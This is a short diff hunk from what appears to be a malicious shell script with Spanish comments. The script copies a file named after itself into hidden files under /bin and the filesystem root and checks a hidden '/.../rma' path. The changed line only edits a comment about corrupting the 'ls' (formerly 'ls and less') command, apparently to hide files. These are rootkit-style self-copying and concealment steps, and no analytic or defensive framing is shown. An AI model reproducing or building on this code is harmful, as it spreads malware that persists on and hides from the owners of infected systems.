@@ -42,7 +42,7 @@ cp $0.x.c /bin/.$0.x.c
 cp $0.x.c /.$0.x.c
 
 
-#Corromper la funcion de ls y less
+#Corromper la funcion de ls
 
 if ! [ -f /.../rma ]
 then
